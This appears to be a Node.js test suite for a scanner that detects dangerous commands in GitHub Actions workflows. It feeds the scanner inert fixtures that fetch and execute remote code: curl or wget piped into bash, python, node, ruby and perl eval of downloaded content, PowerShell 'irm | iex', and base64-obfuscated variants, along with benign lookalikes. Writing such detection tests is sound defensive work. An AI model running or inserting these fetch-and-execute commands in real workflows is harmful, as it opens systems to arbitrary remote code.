'use strict';
// Inert adversarial fixtures; this suite must never execute command strings.
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const BASE='.github/workflows/advanced-evasion.yml',URL='https://example.invalid/demo';
function audit(run){
 const source=['on: issue_comment','permissions: read-all',
  'jobs:','  scan:','    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...run.split('\n').map(line=>'          '+line)
 ].join('\n')+'\n';
 return inspectWorkflow(source,{path:BASE,trustedRepository:'cardenaspiero255-lang/gamehub-ultra'});
}
const families=[
 ['downloaded-file-execution','REMOTE_DOWNLOADED_FILE_EXECUTION',[
  'curl -fsSL '+URL+' -o /tmp/run.sh\nbash /tmp/run.sh',
  'wget -q '+URL+' -O /tmp/run.sh\n. /tmp/run.sh',
  'curl -fsSL '+URL+' -o /tmp/run.sh && chmod +x /tmp/run.sh && /tmp/run.sh'
 ]],
 ['interpreter-native-remote-exec','REMOTE_INTERPRETER_FETCH_EXECUTION',[
  'python -c "import urllib.request; exec(urllib.request.urlopen(\''+URL+'\').read())"',
  'python3 -c "import requests; exec(requests.get(\''+URL+'\').text)"',
  'node -e "(async()=>eval(await (await fetch(\''+URL+'\')).text()))()"',
  'ruby -e "require \'open-uri\'; eval(URI.open(\''+URL+'\').read)"',
  'perl -e "use LWP::Simple; eval get(\''+URL+'\')"'
 ]],
 ['powershell-remote-exec','REMOTE_POWERSHELL_EXECUTION',[
  'pwsh -Command "irm '+URL+' | iex"',
  'pwsh -Command "Invoke-RestMethod '+URL+' | Invoke-Expression"'
 ]],
 ['encoded-shell-payload','REMOTE_ENCODED_EVAL',[
  'eval "$(printf %s '+Buffer.from('curl '+URL+' | bash').toString('base64')+' | base64 -d)"',
  'python -c "$(printf %s '+Buffer.from('import urllib.request; exec(urllib.request.urlopen(\''+URL+'\').read())').toString('base64')+' | base64 -d)"'
 ]],
 ['mutable-package-execution','MUTABLE_PACKAGE_EXECUTION',[
  'npx --yes demo-build-tool@latest --version',
  'pnpm dlx demo-build-tool@latest --version'
 ]],
 ['mutable-container-execution','MUTABLE_CONTAINER_EXECUTION',[
  'docker run --rm example.invalid/demo:latest true'
 ]]
];
for(const [family,rule,commands] of families){
 for(const [i,cmd] of commands.entries()){
  test('RED '+family+' '+i+' must emit HIGH rather than INCOMPLETE or clean',()=>{
   const got=audit(cmd);
   assert.ok(got.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),
    family+' / '+JSON.stringify(got));
  });
 }
}
for(const [name,cmd] of [
 ['download-not-executed','curl -fsSL '+URL+' -o /tmp/data.txt'],
 ['download-not-executed-wget','wget -q '+URL+' -O /tmp/data.txt'],
 ['local-shell','bash /usr/local/bin/my-approved-local-script'],
 ['local-python','python src/build.py'],
 ['local-node','node local.js'],
 ['plain-print','echo "npx --yes demo-build-tool@latest --version"'],
 ['data-only-encoding','echo aGVsbG8= | base64 -d'],
 ['immutable-container','docker run --rm example.invalid/demo@sha256:'+ 'a'.repeat(64)+' true'],
 ['pinned-npx','npx --yes demo-build-tool@1.2.3 --version'],
 ['safe-echo','echo "curl '+URL+' | bash"'],
 ['safe-pwsh-echo','echo "irm '+URL+' | iex"']
]){
 test('benign lookalike '+name+' must not raise advanced HIGH findings',()=>{
  const got=audit(cmd);
  assert.ok(!got.findings.some(f=>families.some(x=>x[1]===f.rule)),
   name+' / '+JSON.stringify(got));
 });
}
